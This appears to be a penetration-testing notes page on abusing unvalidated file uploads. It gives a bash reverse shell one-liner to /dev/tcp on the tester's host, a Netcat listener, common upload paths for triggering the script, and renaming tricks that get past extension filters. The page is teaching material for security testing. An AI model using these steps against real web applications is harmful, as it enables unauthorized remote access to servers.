---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Abuse File Upload

File upload functionality is a common feature in web applications, allowing users to submit images, documents, or other files. However, improper handling of file uploads can lead to severe security risks, including remote code execution (RCE), privilege escalation, and data exfiltration.

Here we find an example scenario where this can be exploited:

* Imagine we find an application that allows users to upload files of a type but it does not validate the file type, for example, a field for submitting an image

```bash
http://$url/submit #xample route of the page with the submit option
```

***

* We should submit a file for an image extension such as _jpg_, or _png_, among others. But as is not validating input we could try to submit an arbitrary file with a script for a Reverse Shell

<pre class="language-sh" data-title="RevShell.sh" data-overflow="wrap" data-line-numbers><code class="lang-sh">#!/bin/bash
<strong>bash -i >&#x26; /dev/tcp/$MyIP/$port 0>&#x26;1
</strong></code></pre>

***

* Then we set up a [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener to catch the connection

{% code overflow="wrap" lineNumbers="true" %}
```bash
 nc -nvlp $port #Same port that is in the script
```
{% endcode %}

***

* Then we hit the web calling the file, and with this, we should catch the shell in our listener

{% code overflow="wrap" lineNumbers="true" %}
```bash
http://$url/RevShell.sh #Invoke the file
http://$url/uploads/RevShell.sh   #Common route for uploaded files
http://$url/_uploaded/RevShell.sh #Another common route for uploaded files
```
{% endcode %}

{% hint style="info" %}
If we don't know where the files are being saved on the web, we could fuzz the URL to find possible directions where they could be
{% endhint %}

***

* In case it's filtering the uploaded files by a string comparison of the extension or name, we could try to change them arbitrarily to match the requested

{% code overflow="wrap" lineNumbers="true" %}
```bash
mv RevShell.sh RevShell.jpg #Change extension if needed to match 
mv RevShell.sh image.jpg    #Change complete name if needed to match
```
{% endcode %}

{% hint style="info" %}
Then we can continue with the process to call the file and gain the remote connection
{% endhint %}
